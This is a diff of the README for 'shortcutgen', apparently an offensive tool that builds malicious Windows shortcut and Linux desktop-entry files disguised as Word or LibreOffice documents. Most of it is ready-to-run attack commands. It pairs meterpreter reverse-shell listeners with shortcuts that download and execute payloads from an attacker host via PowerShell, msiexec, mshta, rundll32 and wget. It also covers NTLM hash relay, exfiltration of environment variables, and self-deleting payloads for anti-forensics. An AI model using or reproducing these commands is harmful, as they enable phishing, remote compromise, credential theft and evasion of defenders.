@@ -22,28 +22,22 @@ Flags:
     -c, --command                       Specify a command to execute.
     -a, --arguments                     Optionally pass the arguments (except it is
                                         mandatory for 'lnk' payload module).
-
     -i, --ip                            Specify an IP address/hostname (applies with
                                         'lnk' payload module).
-
     -e, --environment                   Optionally pass the environment variables to
                                         exfiltrate.
-
     -s, --share                         Specify an SMB share (applies with -h flag
                                         when it's optional for 'lnk' payload module).
-
-    -f, --filename                      Specify a filename. It is optional when 'lnk'
+    -n, --name                          Specify a name. It is optional when 'lnk'
                                         payload module is specified (applies with -h flag).
                                         For 'desktop' payload module it is mandatory.
-
-    -ic, --icon                         Specify a custom icon.
+    --icon                         Specify a custom icon.
     -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                         'normal' is set by default if not specified.
                                         The available windowstyles are: 'normal', 'maximized',
                                         and 'minimized'. For 'desktop' payload it is set to
                                         'false', the available options are: 'true' and 'false'.
-
-    -wd, --workingdirectory             Specify a working directory.
+    --workingdirectory             Specify a working directory.
     -o, --output                        Specify an output.
     -v, --version                       Display the program's version number.
     -h, --help                          Display the help menu.
@@ -55,7 +49,7 @@ Flags:
 
 #### Windows
 
-Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. Then use a `file.docx` word document as an icon that can be outputed from `libreoffice`.
+Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the executable.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1
@@ -63,8 +57,8 @@ $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; exploit"
 
 $ sudo python -m http.server 80
-
-$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+C:\Windows\System32\
+$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.
@@ -76,7 +70,7 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 
 $ sudo python -m http.server 80
 
-$ shortcutgen -p lnk -c "msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging HTA payload (`.hta`) using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
@@ -84,7 +78,7 @@ Generate the shell link then automatically hosting a staging HTA payload (`.hta`
 ```
 $ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"
 
-$ shortcutgen -p lnk -c "mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging DLL payload (`.dll`) using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
@@ -92,7 +86,7 @@ Generate the shell link then automatically hosting a staging DLL payload (`.dll`
 ```
 $ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; exploit"
 
-$ shortcutgen -p lnk -c "rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging scriptlet payload (`.sct`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
@@ -100,7 +94,7 @@ Generate the shell link then automatically hosting a staging scriptlet payload (
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"
 
-$ shortcutgen -p lnk -c "regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 #### Linux
@@ -110,7 +104,7 @@ Generate the desktop entry then automatically hosting a python payload (`.py`) u
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"
 
-$ shortcutgen -p desktop -f "Document File" -c "python" -a "\"<payload>\"" -ic "libreoffice-writer" -wd "/tmp/" -w "false" -o payload.desktop
+$ shortcutgen -p desktop -n "Document File" -c "python" -a "\"<payload>\"" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
 ```
 
 Generate the desktop entry then automatically hosting an ELF payload using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
@@ -118,7 +112,7 @@ Generate the desktop entry then automatically hosting an ELF payload using `meta
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 7; set payload linux/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"
 
-$ shortcutgen -p desktop -f "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown" -ic "libreoffice-writer" -wd "/tmp/" -w "false" -o payload.desktop
+$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
 ```
 
 ### 0x01 - Relay NTLM Hash
@@ -126,19 +120,19 @@ $ shortcutgen -p desktop -f "Document File" -c "wget" -a "wget -qO payload --no-
 Specify the attacker's IP address.
 
 ```
-$ shortcutgen -p lnk -i "192.168.1.4" -s "Documents" -f "document.docx" -o payload.lnk
+$ shortcutgen -p lnk -i "192.168.1.4" -s "Documents" -n "document.docx" -o payload.lnk
 ```
 
 Even a rouge hostname can trigger the DNS.
 
 ```
-$ shortcutgen -p lnk -i "fileserver" -s "Documents" -f "document.docx" -o payload.lnk
+$ shortcutgen -p lnk -i "fileserver" -s "Documents" -n "document.docx" -o payload.lnk
 ```
 
 To exfiltrate environment variables.
 
 ```
-$ shortcutgen -p lnk -i "fileserver" -e "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -f "document.docx" -w "minimized" -o payload.lnk
+$ shortcutgen -p lnk -i "fileserver" -e "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -n "document.docx" -w "minimized" -o payload.lnk
 ```
 
 ### 0x02 - Phishing
@@ -151,21 +145,27 @@ $ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedg
 
 ### 0x03 - Defense Evasion
 
+#### Anti-Forensics
+
 You can of course self delete the payload after execution.
 
 ```
-$ shortcutgen -p lnk -c "C:\\Windows\\System32\\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" -i "C:\path\to" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" --icon "C:\path\to" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
 ```
 
 Including `.desktop` file.
 
 ```
-$ shortcutgen -p desktop -f "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown;sleep 2; rm \$(pwd)/payload.desktop" -wd "/tmp/" -w "false" -o payload.desktop
+$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown;sleep 2; rm \$(pwd)/payload.desktop" --workingdirectory "/tmp/" -w "false" -o payload.desktop
 ```
 
 ## Limitations
 
-The **HotKey** has not been implemented in `wine` so I can't make a feature for persistence. So much potential with this shortcut is gone :(
+- The **HotKey** has not been implemented in `wine` so I can't make a feature for persistence. So much potential with this shortcut is gone :(
+
+- A minor limitation that `wine` lacks choosing file formats as custom icons.
+
+- Creating polyglot is not possible with `wine`'s own `copy` command. Only Windows native `copy` command works.
 
 ## FAQ (Frequent Asked Questions)
 
